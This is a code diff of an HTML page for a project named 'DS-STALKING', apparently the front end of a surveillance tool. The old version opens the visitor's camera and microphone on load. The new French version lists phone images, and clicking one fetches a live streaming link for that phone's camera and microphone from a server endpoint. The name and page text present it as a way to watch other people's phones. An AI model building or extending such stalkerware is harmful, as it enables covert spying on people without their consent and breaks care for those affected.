@@ -1,34 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DS-STALKING - Camera</title>
+    <title>Contrôlez la Caméra et le Micro</title>
 </head>
 <body>
-    <h1>Access Camera and Microphone</h1>
-    
-    <!-- Element for video display -->
-    <video id="video" width="640" height="480" autoplay></video>
-    
+    <h1>Bienvenue dans DS-STALKING</h1>
+    <p>Cliquez sur l'image du téléphone pour obtenir un lien de streaming en direct.</p>
+
+    <div id="phones">
+        <img src="phone1.jpg" alt="Phone 1" class="phone-image" data-phone-id="1">
+        <img src="phone2.jpg" alt="Phone 2" class="phone-image" data-phone-id="2">
+        <img src="phone3.jpg" alt="Phone 3" class="phone-image" data-phone-id="3">
+        <!-- Ajoutez plus d'images si nécessaire -->
+    </div>
+
+    <p id="streamLink"></p>
+
     <script>
-        // Fonction pour demander l'accès à la caméra et au microphone
-        async function startCamera() {
-            try {
-                // Demande l'accès à la caméra et au microphone
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        // Quand une image est cliquée, un lien de streaming est généré
+        document.querySelectorAll('.phone-image').forEach(function(img) {
+            img.addEventListener('click', function() {
+                var phoneId = img.getAttribute('data-phone-id');
 
-                // Affiche le flux vidéo dans l'élément video
-                const videoElement = document.getElementById('video');
-                videoElement.srcObject = stream;
-            } catch (err) {
-                console.error("Erreur d'accès à la caméra et au micro:", err);
-                alert("L'accès à la caméra et au micro a échoué. Veuillez autoriser l'accès.");
-            }
-        }
-
-        // Appeler la fonction pour démarrer la caméra lorsque la page est chargée
-        window.onload = startCamera;
+                fetch(`/get_stream_link/${phoneId}`, {
+                    method: 'POST',  // Requête POST pour obtenir le lien
+                })
+                .then(response => response.json())
+                .then(data => {
+                    // Afficher le lien de streaming dans le HTML
+                    document.getElementById('streamLink').textContent = 'Lien de streaming : ' + data.stream_url;
+                })
+                .catch(error => {
+                    console.error('Erreur:', error);
+                });
+            });
+        });
     </script>
 </body>
 </html>
